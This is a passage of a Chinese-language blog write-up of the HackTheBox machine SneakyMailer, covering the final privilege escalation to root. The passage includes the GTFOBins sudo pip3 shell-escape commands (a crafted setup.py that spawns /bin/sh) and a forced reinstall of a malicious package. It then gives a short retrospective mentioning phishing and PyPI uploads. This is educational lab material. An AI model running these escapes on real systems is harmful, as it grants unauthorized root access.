+<h3 id="提权至root"><a href="#提权至root" class="headerlink" title="提权至root"></a>提权至root</h3><p><img src="https://images.atsud0.me/images/post/image-20201126225658727.png" alt="image-20201126225658727"></p>
+<p>已经成功越权到low用户了，再次执行下信息收集脚本。</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201126230618077.png" alt="image-20201126230618077"></p>
+<p>能<code>sudo pip3</code>。。最喜欢这种了。。不过我一开是用GTFOBins给的提权命令，但是不能成功。（不过如果先开个python pty的话就可以成功。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF&#x3D;$(mktemp -d)</span><br><span class="line">echo &quot;import os; os.execl(&#39;&#x2F;bin&#x2F;sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&quot; &gt; $TF&#x2F;setup.py</span><br><span class="line">sudo pip3 install $TF</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201127003306173.png" alt="image-20201127003306173"></p>
+<p>然后用回了一开始越权到low用户的setup.py脚本改了下端口。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201127000833982.png" alt="image-20201127000833982"></p>
+<p>R O O T E D !</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>难，是真的难。如果没有接触过pypi的话，是真的麻烦。一开始的邮件钓鱼，也是很秀。万万没想到，拿立足点竟然比root还要难。不过在这个靶机也学到了很多，比如怎么上传py包到pypi源，简单的钓鱼邮件利用，收获还是很多的，文章中可能有许多错误或语法不通顺的地方，还请各位大佬多多谅解，有什么问题欢迎私信找我交流。</p>
+<p>参考文章：</p>
+<ul>
+<li><a href="https://blog.csdn.net/weixin_39219503/article/details/103643446" target="_blank" rel="noopener">python pip提权</a></li>
+<li><a href="https://gtfobins.github.io/gtfobins/pip/" target="_blank" rel="noopener">GTFOBins-pip3</a></li>
+<li><a href="https://docs.python.org/2/distutils/setupscript.html" target="_blank" rel="noopener">Writing the setup script</a></li>
+<li><a href="https://pypi.org/project/pypiserver/" target="_blank" rel="noopener">pypiserver</a></li>
+<li><a href="https://packaging.python.org/guides/migrating-to-pypi-org/#uploading" target="_blank" rel="noopener">Publishing releases</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/11/27/HackTheBox-SneakyMailer/" title="HackTheBox-SneakyMailer">http://atsud0.me/2020/11/27/HackTheBox-SneakyMailer/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
+              <a href="/tags/Phishing-email/" rel="tag"><i class="fa fa-tag"></i> Phishing_email</a>
+              <a href="/tags/GTFOBins-pip/" rel="tag"><i class="fa fa-tag"></i> GTFOBins-pip</a>
+              <a href="/tags/pypi/" rel="tag"><i class="fa fa-tag"></i> pypi</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/11/25/HackTheBox-Bucket/" rel="prev" title="HackTheBox-Bucket">
+      <i class="fa fa-chevron-left"></i> HackTheBox-Bucket
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/11/27/HackTheBox-OpenKeyS/" rel="next" title="HackTheBox-OpenKeyS">
+      HackTheBox-OpenKeyS <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-信息收集"><span class="nav-number">1.</span> <span class="nav-text">0x01 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NMAP"><span class="nav-number">1.1.</span> <span class="nav-text">NMAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#directory-busting"><span class="nav-number">1.2.</span> <span class="nav-text">directory busting</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Subdomain-burting"><span class="nav-number">1.3.</span> <span class="nav-text">Subdomain burting</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smtp"><span class="nav-number">1.4.</span> <span class="nav-text">smtp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IMAP"><span class="nav-number">1.5.</span> <span class="nav-text">IMAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ftp"><span class="nav-number">1.6.</span> <span class="nav-text">ftp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#http"><span class="nav-number">1.7.</span> <span class="nav-text">http</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#http-8080"><span class="nav-number">1.8.</span> <span class="nav-text">http-8080</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">0x02 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#smtp-钓鱼邮件"><span class="nav-number">2.1.</span> <span class="nav-text">smtp 钓鱼邮件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ftp-获取立足点"><span class="nav-number">2.2.</span> <span class="nav-text">ftp 获取立足点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-提权"><span class="nav-number">3.</span> <span class="nav-text">0x03 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#上传py模块包-提权-low"><span class="nav-number">3.1.</span> <span class="nav-text">上传py模块包-提权 low</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权至root"><span class="nav-number">3.2.</span> <span class="nav-text">提权至root</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-总结"><span class="nav-number">4.</span> <span class="nav-text">0x04 总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
